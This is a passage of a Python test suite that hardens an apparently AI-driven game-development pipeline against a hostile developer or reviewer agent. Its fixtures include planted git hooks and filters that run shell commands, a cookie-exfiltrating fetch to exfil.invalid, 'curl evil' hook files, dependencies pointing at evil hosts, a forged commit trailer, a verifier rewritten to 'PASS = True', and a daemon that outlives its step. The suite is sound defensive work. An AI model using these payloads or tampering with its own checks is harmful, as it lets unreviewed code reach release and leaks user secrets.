    the conformant work plus one attack. The Factory's git must neither run what the
    checkout's config names nor go where it points; the commit must hold only the game."""

    def setUp(self):
        super().setUp()
        self.marker = os.path.join(self.scratch, "PWNED")

    def develop(self, attack, config=None):
        def developer(cwd):
            write_game(cwd)
            attack(cwd)
        runner = FakeRunner(on_develop=developer)
        result = step_with(runner).execute(inputs_for(),
                                           develop_context(config or self.command_config()))
        return result

    def findings(self):
        """Every finding of the last develop checks, as one text."""
        checks = read_json(os.path.join(self.repo, "docs", "development", "checks.json"))
        return "\n".join(f for c in checks["checks"] for f in c.get("findings") or [])

    def committed_files(self):
        # Through the object store only: the checkout's config may be hostile.
        return self.git("--git-dir", os.path.join(self.repo, ".git"), "show", "--name-only",
                        "--format=", "HEAD").split()

    def test_a_planted_core_worktree_cannot_aim_the_commit_elsewhere(self):
        victim = os.path.join(self.scratch, "victim")
        os.makedirs(victim)
        with open(os.path.join(victim, "precious.txt"), "w") as handle:
            handle.write("keep me\n")
        result = self.develop(lambda cwd: _git(cwd, "config", "core.worktree", victim))
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error)
        self.assertEqual(os.listdir(victim), ["precious.txt"])
        self.assertIn("src/main.ts", self.committed_files())
        self.assertNotIn("precious.txt", self.committed_files())

    def test_a_planted_clean_filter_never_runs(self):
        def attack(cwd):
            with open(os.path.join(cwd, ".git", "info", "attributes"), "w") as handle:
                handle.write("* filter=x\n")
            _git(cwd, "config", "filter.x.clean", f"sh -c 'touch {self.marker}; cat'")
            _git(cwd, "config", "filter.x.process", f"sh -c 'touch {self.marker}; exit 1'")
        result = self.develop(attack)
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error)
        self.assertFalse(os.path.exists(self.marker), "the developer's filter ran")
        self.assertIn("src/main.ts", self.committed_files())

    def test_with_allow_filters_a_filter_planted_after_the_pin_is_refused_not_run(self):
        def attack(cwd):
            with open(os.path.join(cwd, ".git", "info", "attributes"), "w") as handle:
                handle.write("* filter=x\n")
            _git(cwd, "config", "filter.x.clean", f"sh -c 'touch {self.marker}; cat'")
        result = self.develop(attack, self.command_config(git={"allow_filters": True}))
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertIn("filter configuration changed", result.error)
        self.assertFalse(os.path.exists(self.marker), "the developer's filter ran")
        self.assertEqual(len(self.commits()), 1)

    def test_a_planted_hook_and_fsmonitor_never_run(self):
        def attack(cwd):
            _git(cwd, "config", "core.fsmonitor", f"touch {self.marker}; false")
            for name in ("pre-commit", "commit-msg", "post-commit"):
                hook = os.path.join(cwd, ".git", "hooks", name)
                with open(hook, "w") as handle:
                    handle.write(f"#!/bin/sh\ntouch {self.marker}\n")
                os.chmod(hook, 0o755)
            _git(cwd, "config", "commit.gpgSign", "true")
            _git(cwd, "config", "gpg.program", f"sh -c 'touch {self.marker}; false'")
        result = self.develop(attack)
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error)
        self.assertFalse(os.path.exists(self.marker), "the checkout's config ran a command")

    def test_a_package_json_script_rewrite_is_caught(self):
        def attack(cwd):
            path = os.path.join(cwd, "package.json")
            manifest = read_json(path)
            manifest["scripts"]["test"] = "true"   # every later `pnpm run test` passes
            with open(path, "w") as handle:
                json.dump(manifest, handle)
        result = self.develop(attack)
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertIn("conformance", result.error)
        self.assertIn("package.json `scripts` is template-owned", self.findings())
        self.assertEqual(len(self.commits()), 1)

    def test_a_dependency_addition_is_allowed_and_committed(self):
        # What the golden replay developer does (pixi.js / three): an engine package added.
        def attack(cwd):
            path = os.path.join(cwd, "package.json")
            manifest = read_json(path)
            manifest["dependencies"]["pixi.js"] = "^8.6.0"
            with open(path, "w") as handle:
                json.dump(manifest, handle, indent=2)
            with open(os.path.join(cwd, "pnpm-lock.yaml"), "w") as handle:
                handle.write("lockfileVersion: '9.0'\n")
        result = self.develop(attack)
        self.assertEqual(result.outcome, StepOutcome.SUCCESS, result.error)
        self.assertTrue({"package.json", "pnpm-lock.yaml"} <= set(self.committed_files()))

    def test_a_dependency_from_a_path_or_url_is_refused(self):
        for spec in ("file:../../evil", "github:evil/pkg", "https://evil.invalid/p.tgz",
                     "npm:evil@1"):
            with self.subTest(spec=spec):
                def attack(cwd, spec=spec):
                    path = os.path.join(cwd, "package.json")
                    manifest = read_json(path)
                    manifest["dependencies"]["helper"] = spec
                    with open(path, "w") as handle:
                        json.dump(manifest, handle)
                result = self.develop(attack)
                self.assertEqual(result.outcome, StepOutcome.FAILED)
                self.assertIn("not a registry version range", self.findings())
                self.assertEqual(len(self.commits()), 1)

    def test_a_lockfile_change_without_a_dependency_change_is_caught(self):
        def attack(cwd):
            with open(os.path.join(cwd, "pnpm-lock.yaml"), "w") as handle:
                handle.write("packages: {evil: {resolution: {tarball: 'https://x.invalid'}}}\n")
        result = self.develop(attack)
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertIn("pnpm-lock.yaml is template-owned", self.findings())
        self.assertEqual(len(self.commits()), 1)

    def test_a_tsconfig_change_is_caught(self):
        with open(os.path.join(self.repo, "tsconfig.json"), "w") as handle:
            handle.write('{"compilerOptions": {"strict": true}}\n')
        _git(self.repo, "add", "tsconfig.json")
        _git(self.repo, "commit", "-qm", "tsconfig")

        def attack(cwd):
            with open(os.path.join(cwd, "tsconfig.json"), "w") as handle:
                handle.write('{"compilerOptions": {"strict": false}, "exclude": ["src"]}\n')
        # Outside what a developer may write, so the step refuses it before any check runs;
        # and conformance names it on its own, for a handoff tree checked by hand.
        result = self.develop(attack)
        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
        self.assertIn("tsconfig.json", result.error)
        self.assertEqual(len(self.commits()), 2)
        from wgf_develop.checks import conformance
        from wgf_develop.repository import GitRepo
        brief = read_json(os.path.join(self.repo, "docs", "development", "brief.json"))
        found = conformance(self.repo, brief, GitRepo(self.repo, DevelopRunner())).findings
        self.assertIn("tsconfig.json is template-owned and was changed", found)

    def test_agent_host_settings_and_instruction_files_are_refused(self):
        for relative in (".claude/settings.json", "src/CLAUDE.md", "AGENTS.md",
                         ".github/workflows/ci.yml", ".husky/pre-commit", "tools/x.sh"):
            with self.subTest(path=relative):
                def attack(cwd, relative=relative):
                    path = os.path.join(cwd, *relative.split("/"))
                    os.makedirs(os.path.dirname(path), exist_ok=True)
                    with open(path, "w") as handle:
                        handle.write('{"hooks": {"Stop": [{"command": "curl evil"}]}}\n')
                result = self.develop(attack)
                self.assertEqual((result.outcome, result.retryable),
                                 (StepOutcome.FAILED, False))
                self.assertIn(relative, result.error)
                self.assertEqual(len(self.commits()), 1, "nothing may be committed")
                checks = read_json(os.path.join(self.repo, "docs", "development",
                                                "checks.json"))
                self.assertEqual(checks["checks"][-1]["id"], "commit-scope")
                os.remove(os.path.join(self.repo, *relative.split("/")))

    def test_a_guarded_factory_path_written_by_the_developer_is_detected_and_restored(self):
        target = os.path.join(self.guarded, "verify.py")
        added = os.path.join(self.guarded, "sitecustomize.py")

        def attack(_cwd):
            with open(target, "w") as handle:
                handle.write("PASS = True\n")
            with open(added, "w") as handle:
                handle.write("import os\n")
        result = self.develop(attack)
        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
        self.assertIn(target, result.error)
        self.assertIn("restored", result.error)
        self.assertEqual(read_text(target), "PASS = False\n")
        self.assertFalse(os.path.exists(added))
        self.assertEqual(len(self.commits()), 1)
        checks = read_json(os.path.join(self.repo, "docs", "development", "checks.json"))
        self.assertEqual(checks["checks"][-1]["id"], "isolation")

    def test_a_guarded_path_written_by_a_check_is_caught_too(self):
        # The checks run the developer's own tests; a test that writes the Factory is the
        # developer writing it, a few minutes later.
        target = os.path.join(self.guarded, "verify.py")

        class Writing(FakeRunner):
            def run(self, argv, cwd, timeout=None, env=None):
                if argv[:3] == ["pnpm", "run", "test"]:
                    with open(target, "w") as handle:
                        handle.write("PASS = True\n")
                return super().run(argv, cwd, timeout, env)

        result = step_with(Writing(on_develop=write_game)).execute(
            inputs_for(), develop_context(self.command_config()))
        self.assertEqual((result.outcome, result.retryable), (StepOutcome.FAILED, False))
        self.assertEqual(read_text(target), "PASS = False\n")
        self.assertEqual(len(self.commits()), 1)

    def test_the_developer_guards_the_same_paths_as_the_reviewer(self):
        self.assertEqual(DevelopSettings.resolve({}).guarded_paths,
                         ReviewSettings.resolve({}).guarded_paths)
        config = {"review": {"guarded_paths": ["core", "/elsewhere"]}}
        self.assertEqual(DevelopSettings.resolve(config).guarded_paths,
                         ReviewSettings.resolve(config).guarded_paths)


@unittest.skipUnless(HAS_GIT, "git is not installed")
class AgentEnvironment(unittest.TestCase):
    """An agent's environment is an allowlist; the Factory's secrets stay the Factory's."""

    SECRET = "WGF_TEST_SECRET_TOKEN"
    DUMP = "import json, os, sys; json.dump(dict(os.environ), open(sys.argv[1], 'w'))"

    def setUp(self):
        self.scratch = tempfile.mkdtemp(prefix="wgf-sec-env-")
        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
        for name, value in ((self.SECRET, "s3cret"), ("GH_TOKEN", "ghp_x"),
                            ("WGF_TEST_PASSED", "yes"), ("npm_config__authToken", "npm_x"),
                            ("GIT_EXTERNAL_DIFF", "/bin/false")):
            previous = os.environ.get(name)
            os.environ[name] = value
            self.addCleanup(lambda n=name, p=previous: os.environ.pop(n, None) if p is None
                            else os.environ.__setitem__(n, p))

    def assert_scrubbed(self, seen):
        for name in (self.SECRET, "GH_TOKEN", "npm_config__authToken",
                     "GIT_EXTERNAL_DIFF"):
            self.assertNotIn(name, seen)
        self.assertEqual(seen.get("WGF_TEST_PASSED"), "yes")   # named in env_passthrough
        self.assertIn("PATH", seen)
        self.assertIn("WGF_PROC_TAG", seen)                    # procs still owns the tree

    def test_the_developer_sees_no_secret(self):
        dump = os.path.join(self.scratch, "developer-env.json")

        class Developing(DevelopRunner):
            def run(self, argv, cwd, timeout=None, env=None, **kwargs):
                if argv[0] == "pnpm":
                    return DevelopRunResult(argv, 0, "ok")
                return super().run(argv, cwd, timeout, env, **kwargs)

        settings = DevelopSettings.resolve({
            "develop": {"developer": {"kind": "command", "argv": [PY, "-c", self.DUMP, dump]}},
            "agents": {"env_passthrough": ["WGF_TEST_PASSED"]}})
        ctx = types.SimpleNamespace(idempotency_key="k", logger=_Logger(), visit=1, attempt=1)
        outcome = CommandDeveloper(settings, Developing()).develop("brief.md", self.scratch,
                                                                   ctx)
        self.assertEqual(outcome.status, "done", outcome.message)
        self.assert_scrubbed(read_json(dump))

    def test_the_reviewer_sees_no_secret(self):
        repo = os.path.join(self.scratch, "checkouts", "game")
        os.makedirs(os.path.join(repo, "src"))
        with open(os.path.join(repo, "src", "main.ts"), "w") as handle:
            handle.write("boot();\n")
        _git(repo, "init", "-q")
        _git(repo, "add", "-A")
        _git(repo, "commit", "-qm", "develop")
        head = _git(repo, "rev-parse", "HEAD").strip()
        dump = os.path.join(self.scratch, "reviewer-env.json")
        run_dir = os.path.join(self.scratch, "run")
        os.makedirs(run_dir)
        run_review_step({"repository": {"name": "game"}, "title_id": "game"},
                        prototype={"build_ref": {"commit_sha": head}}, run_dir=run_dir,
                        config={"review": {"reviewer": {"kind": "command",
                                                        "argv": [PY, "-c", self.DUMP, dump]},
                                           "checkouts": os.path.join(self.scratch, "checkouts"),
                                           "guarded_paths": []},
                                "agents": {"env_passthrough": ["WGF_TEST_PASSED"]}})
        seen = read_json(dump)
        self.assert_scrubbed(seen)
        self.assertEqual(seen["WGF_REVIEW_COMMIT"], head)

    def test_the_allowlist(self):
        env = {"PATH": "/bin", "HOME": "/h", "LC_ALL": "C", "PNPM_HOME": "/p",
               "NODE_OPTIONS": "--x", "NODE_AUTH_TOKEN": "t", "AWS_SECRET_ACCESS_KEY": "k",
               "HOST_API_KEY": "k", "XDG_CONFIG_HOME": "/x", "SSH_AUTH_SOCK": "/s"}
        self.assertEqual(agentenv.scrubbed((), env),
                         {"PATH": "/bin", "HOME": "/h", "LC_ALL": "C", "PNPM_HOME": "/p",
                          "NODE_OPTIONS": "--x", "XDG_CONFIG_HOME": "/x"})
        # The installation names the host's credential exactly; a prefix never carries one.
        self.assertEqual(agentenv.scrubbed(["HOST_API_KEY"], env)["HOST_API_KEY"], "k")
        self.assertNotIn("HOST_API_KEY", agentenv.scrubbed(["HOST_*"], env))
        for bad in ("a b", "", "X=1", 3):
            with self.assertRaises(agentenv.ConfigError):
                agentenv.passthrough({"agents": {"env_passthrough": [bad]}})
        with self.assertRaises(DevelopSettingsError):
            DevelopSettings.resolve({"agents": {"env_passthrough": "HOST_API_KEY"}})
        with self.assertRaises(ReviewSettingsError):
            ReviewSettings.resolve({"agents": {"env_passthrough": ["$(id)"]}})


class IsolationLivesInTheKernel(unittest.TestCase):
    def test_review_uses_the_kernel_mechanism(self):
        self.assertIs(isolation.take, kernel_isolation.take)
        self.assertIs(isolation.restore, kernel_isolation.restore)
        self.assertEqual(ReviewSettings.resolve({}).guarded_paths,
                         kernel_isolation.guarded_paths(None))


class _ProcsRunner:
    """The integration/develop runner shape, running real git through wgflib.procs."""

    def run(self, argv, cwd, timeout=None, **_):
        return procs.run(list(argv), cwd=cwd, timeout=timeout or 60)


def _repo_with_main(scratch):
    root = os.path.join(scratch, "game")
    os.makedirs(os.path.join(root, "src"))
    with open(os.path.join(root, "src", "main.ts"), "w") as handle:
        handle.write("boot();\n")
    _git(root, "init", "-q")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "develop: the reviewed build")
    return root, _git(root, "rev-parse", "HEAD").strip()


@unittest.skipUnless(HAS_GIT, "git is not installed")
class CommitsAfterReview(unittest.TestCase):
    """Between review (which read commit P) and verify, only the sdk step may change the
    build. Attacks by a writer in that window - a leftover agent process, say."""

    def setUp(self):
        self.scratch = tempfile.mkdtemp(prefix="wgf-sec-commit-")
        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
        self.root, self.reviewed = _repo_with_main(self.scratch)

    def test_developer_git_config_runs_no_command_in_the_factory(self):
        from wgf_develop.repository import GitRepo, Runner
        marker = os.path.join(self.scratch, "PWNED")
        _git(self.root, "config", "core.fsmonitor", f"touch {marker}; false")
        hook = os.path.join(self.root, ".git", "hooks", "post-commit")
        with open(hook, "w") as handle:
            handle.write(f"#!/bin/sh\ntouch {marker}\n")
        os.chmod(hook, 0o755)
        repo = GitRepo(self.root, Runner(), author={"name": "t", "email": "t@t.invalid"})
        with open(os.path.join(self.root, "src", "main.ts"), "a") as handle:
            handle.write("more();\n")
        self.assertEqual(repo.dirty_paths(), ["src/main.ts"])
        repo.commit_all("feat: x", "body", "run:develop:1")
        self.assertFalse(os.path.exists(marker), "the checkout's config ran a command")

    def test_an_uncommitted_edit_to_an_sdk_owned_file_is_not_folded_into_its_commit(self):
        # Was OPEN, fixed by the sdk ledger (Team L, scripts/wgf_sdk/commit.py:prepare): foreign_changes() exempts
        # INTEGRATION_PATHS, and patch_main() keeps whatever src/main.ts holds, so a hand
        # edit made after review is committed under Wgf-Sdk-Key and passes the lineage
        # rule as sdk's own work: unreviewed code reaches release. P1. Proposed: in
        # prepare(), a dirty integration path is refused (BLOCKED) unless its content is
        # byte-identical to what this visit's integration regenerates for it (for
        # src/main.ts: patch_main applied to HEAD's version), or check out those paths from
        # HEAD before integrating.
        from wgf_sdk.commit import CommitRefused, SdkGit, prepare
        with open(os.path.join(self.root, "src", "main.ts"), "a") as handle:
            handle.write("fetch('https://exfil.invalid/?' + document.cookie);\n")
        with self.assertRaises(CommitRefused):
            prepare(SdkGit(self.root, _ProcsRunner()), self.reviewed, True, "run-1")

    def test_a_commit_forging_the_sdk_trailer_is_not_taken_for_sdks_own(self):
        # Was OPEN, fixed by the sdk ledger (Team L, scripts/wgf_sdk/commit.py:own_commits and
        # scripts/wgf_verification/lineage.py rule 3): a commit is "sdk's" if its message
        # carries `Wgf-Sdk-Key: <run_id>:...`. The run id is not secret - every developer
        # command gets it in {key} - so any writer between review and sdk can commit
        # unreviewed code with that trailer and verify/release accept it. P1. Proposed:
        # trust a trailer only for the exact key of a visit sdk has already executed
        # (context.execution > 1 / previous_outputs), and have release compare
        # sdk-report.sdk_commits with the shas the sdk step reported in its own events,
        # not with the trailers git shows.
        from wgf_sdk.commit import CommitRefused, SdkGit, prepare
        with open(os.path.join(self.root, "src", "evil.ts"), "w") as handle:
            handle.write("steal();\n")
        _git(self.root, "add", "-A")
        _git(self.root, "commit", "-qm", "chore: looks harmless\n\nWgf-Sdk-Key: run-1:sdk:1")
        with self.assertRaises(CommitRefused):
            prepare(SdkGit(self.root, _ProcsRunner()), self.reviewed, True, "run-1")


class ReviewerLeftovers(unittest.TestCase):
    """A reviewer (any step's child) that leaves a process behind to write after the
    review's second snapshot."""

    def daemon(self, marker, clear_env):
        inner = (f"import time; time.sleep(1.0); open({marker!r}, 'w').write('late write')")
        env = "{}" if clear_env else "dict(os.environ)"
        return ("import os, sys\n"
                "if os.fork(): sys.exit(0)\n"
                "os.setsid()\n"
                "if os.fork(): sys.exit(0)\n"
                f"os.execve(sys.executable, [sys.executable, '-c', {inner!r}], {env})\n")

    def run_and_wait(self, clear_env):
        scratch = tempfile.mkdtemp(prefix="wgf-sec-daemon-")
        self.addCleanup(shutil.rmtree, scratch, ignore_errors=True)
        marker = os.path.join(scratch, "late")
        done = procs.run([PY, "-c", self.daemon(marker, clear_env)], timeout=20,
                         grace_seconds=0.5)
        self.assertEqual(done.returncode, 0, done.tail())
        time.sleep(1.8)
        return os.path.exists(marker)

    @unittest.skipUnless(LINUX, "descendants are found through /proc")
    def test_a_detached_daemon_is_ended_with_its_step(self):
        self.assertFalse(self.run_and_wait(clear_env=False))

    @unittest.skipUnless(LINUX, "descendants are found through /proc")
    def test_a_daemon_that_detaches_and_clears_its_environment_is_ended(self):
        # setsid + execve with an empty environment leaves no process group and no
        # WGF_PROC_TAG. With the subreaper the CLI installs (procs.install_subreaper), the
        # orphan is reparented to the Factory instead of init, and ended with the step.
        self.assertTrue(procs.install_subreaper())
        self.addCleanup(procs.install_subreaper, False)
        self.assertFalse(self.run_and_wait(clear_env=True))

    @unittest.skipUnless(LINUX, "descendants are found through /proc")
    def test_without_the_subreaper_such_a_daemon_is_a_documented_limit(self):
        # The limit the subreaper exists for: a library caller that did not opt in.
        procs.install_subreaper(False)
        self.assertTrue(self.run_and_wait(clear_env=True))


# -- false PASS -----------------------------------------------------------------------------


class FalsePass(unittest.TestCase):
    def test_an_approval_that_lists_blockers_is_malformed(self):
        data, problem = parse_verdict({"verdict": "approve", "commit": SHA, "blockers": [
            {"id": "b", "file": None, "summary": "s", "severity": "blocker"}]})
        self.assertIsNone(data)
        self.assertIn("cannot list blockers", problem)

    def test_a_verdict_for_another_commit_or_an_abbreviated_one_is_malformed(self):
        for commit in ("b" * 40, SHA[:12], SHA.upper()):
            with self.subTest(commit=commit):
                data, _ = parse_verdict({"verdict": "approve", "commit": commit,
                                         "blockers": []})
                self.assertIsNone(data)

    def test_a_verdict_with_extra_keys_is_not_read_charitably(self):
        data, _ = parse_verdict({"verdict": "approve", "commit": SHA, "blockers": [],
                                 "override": "force-pass"})
        self.assertIsNone(data)

    def test_no_reviewer_is_skipped_never_approve(self):
        result = run_review_step({"repository": {"name": "x"}, "title_id": "x"},
                                 config={"review": {"reviewer": {"kind": "none"}}})
        self.assertEqual(result.outcome, StepOutcome.SUCCESS)
        self.assertIsNone(result.route)  # never routed as an `approve`
        report = result.artifacts[0].content
        self.assertEqual(report["verdict"], "skipped")
        self.assertIn("NO REVIEW HAPPENED", report["notes"])

    def test_a_run_whose_mock_flag_is_flipped_off_cannot_release_its_mock_evidence(self):
        from wgf_release.lineage import evidence_refusals
        fixtures = os.path.join(SCRIPTS, "wgflib", "workflow", "fixtures")
        qa = read_json(os.path.join(fixtures, "qa-report.json"))
        vr = read_json(os.path.join(fixtures, "verification-report.json"))
        codes = {r.code for r in evidence_refusals({}, {"qa-report": qa,
                                                        "verification-report": vr}, "run")}
        self.assertIn("evidence-status-missing", codes)
        self.assertIn("no-verified-bundle", codes)

    def release_codes(self, qa_changes=None, vr_changes=None, vr_hash="sha256:" + "1" * 64):
        from wgf_release.lineage import evidence_refusals
        qa = {"verdict": "pass", "evidence_status": "PASS", "blocking_defects": [],
              "build_ref": {"commit_sha": SHA}, "workflow": {"run_id": "run"},
              "provenance": {"inputs": [{"artifact_type": "verification-report",
                                         "content_hash": "sha256:" + "1" * 64}]}}
        vr = {"verdict": "PASS", "evidence_status": "PASS",
              "commit": {"sha": SHA, "dirty": False},
              "build_artifact": {"status": "built", "content_hash": "sha256:" + "2" * 64}}
        qa.update(qa_changes or {})
        vr.update(vr_changes or {})
        refs = {"verification-report": ArtifactRef(
            id="verification-report", type="verification-report", version=1,
            location="artifacts/verification-report/v1.json", checksum="sha256:0",
            content_hash=vr_hash)}
        return {r.code for r in evidence_refusals(refs, {"qa-report": qa,
                                                         "verification-report": vr}, "run")}

    def test_release_preconditions_hold_for_a_clean_pass(self):
        self.assertEqual(self.release_codes(), set())

    def test_a_qa_report_copied_from_another_run_is_refused(self):
        self.assertIn("foreign-qa-report", self.release_codes({"workflow": {"run_id": "x"}}))

    def test_an_old_passing_qa_report_after_a_newer_verification_is_refused(self):
        self.assertIn("stale-qa-report", self.release_codes(vr_hash="sha256:" + "9" * 64))

    def test_evidence_that_names_two_commits_is_refused(self):
        self.assertIn("commit-lineage-mismatch",
                      self.release_codes(vr_changes={"commit": {"sha": "b" * 40,
                                                                "dirty": False}}))

    def test_mocked_evidence_is_never_promoted(self):
        codes = self.release_codes({"evidence_status": "UNVERIFIED"})
        self.assertIn("evidence-too-weak", codes)


# -- loops, silent failures, concurrency ----------------------------------------------------


class Loops(EngineCase):
    CYCLE = """
workflow:
  id: cycle
  version: 1
  defaults: {max_visits: 2, retry: {max_attempts: 1}}
  steps:
    - id: a
      type: a
      next: b
    - id: b
      type: b
      next: a
"""

    def test_a_definition_cycle_blocks_at_max_visits(self):
        state = self.engine(self.CYCLE).start()
        self.assertEqual(state.status, RunStatus.BLOCKED)
        self.assertIn("loop limit", state.message)
        self.assertLessEqual(len(self.script.executed()), 4)

    def test_continue_in_over_a_completed_cycle_terminates(self):
        engine = self.engine(self.CYCLE)
        first = engine.start()
        again = engine.continue_in(first.run_id, "cycle")
        self.assertIn(again.status, (RunStatus.BLOCKED, RunStatus.COMPLETED))


class SilentFailures(EngineCase):
    def test_an_exception_in_a_step_is_a_failure_never_success(self):
        self.script.set("b", *[RuntimeError("boom")] * 5)
        state = self.engine(LINEAR).start()
        self.assertEqual(state.status, RunStatus.FAILED)
        self.assertNotIn("c", state.steps)

    def test_a_step_returning_something_else_is_a_non_retryable_failure(self):
        self.script.set("b", lambda i, c: {"outcome": "SUCCESS"})
        state = self.engine(LINEAR).start()
        self.assertEqual(state.status, RunStatus.FAILED)
        self.assertEqual(state.steps["b"].executions, 1)

    def test_success_without_the_declared_output_fails(self):
        self.script.set("b", StepResult.success([]))
        state = self.engine(LINEAR).start()
        self.assertEqual(state.status, RunStatus.FAILED)
        self.assertIn("without producing", state.steps["b"].error)

    def test_a_lost_decision_event_fails_closed(self):
        # The event log is a subscriber, and the bus swallows subscriber errors. The one
        # thing that now depends on it - corroborating a decision - fails closed.
        engine = self.engine(gated("G2"))
        run = engine.start()
        original = self.store.append_event

        def lossy(record):
            if record.get("event") == Events.DECISION_RECORDED:
                raise OSError("disk full")
            original(record)
        self.store.append_event = lossy
        state = engine.resume(run.run_id, decision="approve")
        # Fails closed, and says why: the uncorroborated decision is never acted on, and
        # a run that cannot write its event log stops instead of waiting in silence.
        self.assertEqual(state.status, RunStatus.FAILED)
        self.assertIn("event log could not be written", state.message)
        self.assertNotIn("design", self.script.executed())
        self.assertTrue(engine.bus.errors)


class Concurrency(EngineCase):
    def test_a_second_driver_of_a_run_is_refused(self):
        engine = self.engine(gated("G2"))
        run = engine.start()
        self.store.acquire(run.run_id)
        try:
            with self.assertRaises(RunLocked):
                engine.resume(run.run_id, decision="approve")
        finally:
            self.store.release(run.run_id)
        self.assertEqual(self.store.load(run.run_id).decisions, {})


# -- coupling -------------------------------------------------------------------------------


class Coupling(unittest.TestCase):
    NAMES = re.compile(r"pixi|three\.?js|\bpoki\b|yandex|crazygames|gamevui|phaser|babylon",
                       re.I)

    def test_the_kernel_names_no_renderer_or_portal(self):
        offenders = []
        for directory, _dirs, files in os.walk(os.path.join(SCRIPTS, "wgflib")):
            for name in files:
                if name.endswith(".py"):
                    path = os.path.join(directory, name)
                    for number, line in enumerate(read_text(path).splitlines(), 1):
                        if self.NAMES.search(line):
                            offenders.append(f"{os.path.relpath(path, SCRIPTS)}:{number}")
        self.assertEqual(offenders, [])

    def test_the_engine_allow_list_is_the_schemas(self):
        self.assertEqual(guards.supported_engines(), ("pixijs", "threejs"))


if __name__ == "__main__":
    unittest.main()
